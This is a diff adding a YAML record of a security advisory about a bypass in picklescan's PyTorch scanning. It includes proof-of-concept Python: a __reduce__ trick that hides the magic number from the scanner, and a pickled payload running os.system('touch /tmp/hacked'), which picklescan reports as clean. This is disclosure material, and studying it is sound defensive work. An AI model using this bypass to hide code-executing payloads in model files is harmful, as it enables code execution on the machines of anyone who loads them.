@@ -1,0 +1,55 @@
+advisory_id: GHSA-97f8-7cmv-76j2
+datasource_id: github_osv_importer_v2/GHSA-97f8-7cmv-76j2
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-97f8-7cmv-76j2/GHSA-97f8-7cmv-76j2.json
+aliases: []
+summary: "Picklescan (scan_pytorch) Bypass via dynamic eval MAGIC_NUMBER\n### Summary\nThis\
+  \ is a scanning bypass to `scan_pytorch` function in `picklescan`. As we can see in the implementation\
+  \ of [get_magic_number()](https://github.com/mmaitre314/picklescan/blob/2a8383cfeb4158567f9770d86597300c9e508d0f/src/picklescan/torch.py#L76C5-L84)\
+  \ that uses `pickletools.genops(data)` to get the `magic_number` with the condition `opcode.name`\
+  \ includes `INT` or `LONG`, but the PyTorch's implemtation simply uses [pickle_module.load()](https://github.com/pytorch/pytorch/blob/134179474539648ba7dee1317959529fbd0e7f89/torch/serialization.py#L1797)\
+  \ to get this `magic_number`. For this implementation difference, we then can embed the `magic_code`\
+  \ into the `PyTorch` file via dynamic `eval` on the `\\_\\_reduce\\_\\_` trick, which can\
+  \ make the `pickletools.genops(data)` cannot get the `magic_code` in `INT` or `LONG` type,\
+  \ but the `pickle_module.load()` can still return the same `magic_code`, eading to a bypass.\n\
+  \n### PoC\n#### Attack Step 1\nwe can edit the source code of the function [\\_legacy\\_save()](https://github.com/pytorch/pytorch/blob/134179474539648ba7dee1317959529fbd0e7f89/torch/serialization.py#L1120)\
+  \ as follows:\n```Python\n    class payload:\n        def __reduce__(self):\n            return\
+  \ (eval, ('MAGIC_NUMBER',))\n\n    pickle_module.dump(payload(), f, protocol=pickle_protocol)\n\
+  ```\n#### Attack Step 2\nwith the modified version of `PyTorch`, we run the following PoC\
+  \ to generate the `payload.pt`:\n```Python\nimport torch \n\nclass payload:\n    def __reduce__(self):\n\
+  \        return (__import__('os').system, ('touch /tmp/hacked',))\n\ntorch.save(payload(),\
+  \ './payload.pt', _use_new_zipfile_serialization = False)\n```\n\n#### Picklescan result\n\
+  ```\nERROR: Invalid magic number for file /home/pzhou/bug-bunty/pytorch/PoC/payload.pt: None\
+  \ != 119547037146038801333356\n----------- SCAN SUMMARY -----------\nScanned files: 0\nInfected\
+  \ files: 0\nDangerous globals: 0\n```\n\n#### Victim Step\n```Python\nimport torch\ntorch.load('./payload.pt',\
+  \ weights_only=False)\n```\nthen you can find the illegal file `/tmp/hacked` created in your\
+  \ local system.\n\n### Impact\nCraft malicious `PyTorch` payloads to bypass `picklescan`,\
+  \ then recall ACE/RCE."
+impacted_packages:
+  - purl: pkg:pypi/picklescan
+    affected_versions: vers:pypi/<1.0.3
+    fixed_versions: vers:pypi/1.0.3
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.1'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-97f8-7cmv-76j2/GHSA-97f8-7cmv-76j2.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-184
+references:
+  - url: https://github.com/mmaitre314/picklescan
+    reference_type:
+    reference_id:
+  - url: https://github.com/mmaitre314/picklescan/commit/b9997634683a4f4bd0c7e3701e7ce7e90fe70e8c
+    reference_type:
+    reference_id:
+  - url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-97f8-7cmv-76j2
+    reference_type:
+    reference_id:
